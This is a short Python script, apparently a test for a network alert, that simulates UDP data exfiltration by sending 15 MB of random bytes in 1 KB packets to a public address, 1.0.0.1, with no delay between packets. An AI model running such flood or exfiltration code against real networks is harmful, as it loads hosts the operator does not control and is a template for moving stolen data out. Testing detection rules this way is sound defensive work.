# attack_exfil_fixed.py
import socket
import time
import os

TARGET_IP = "1.0.0.1"
TARGET_PORT = 12345

# 1. Use a safe packet size (1 KB) that fits in any network
PACKET_SIZE = 1024  
# 2. To send 15 MB total, we need 15,360 packets of 1 KB
TOTAL_PACKETS = 15 * 1024 

print(f"🚀 STARTING UDP EXFIL ATTACK -> {TARGET_IP}")
print(f"📦 Goal: Send 15 MB using {TOTAL_PACKETS} small packets")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

try:
    for i in range(TOTAL_PACKETS):
        # Generate 1 KB of garbage data
        payload = os.urandom(PACKET_SIZE)
        sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        
        # Progress bar every 1000 packets (approx every 1 MB)
        if i % 1024 == 0:
            mb_sent = i // 1024
            print(f"--> Sent {mb_sent} MB...")
            
        # No sleep needed - we want to flood the network to trigger the "MB/s" alert
        # But if your computer freezes, add time.sleep(0.001) here

    print("✅ ATTACK COMPLETE: 15 MB sent successfully.")

except Exception as e:
    print(f"❌ Error: {e}")
finally:
    sock.close()
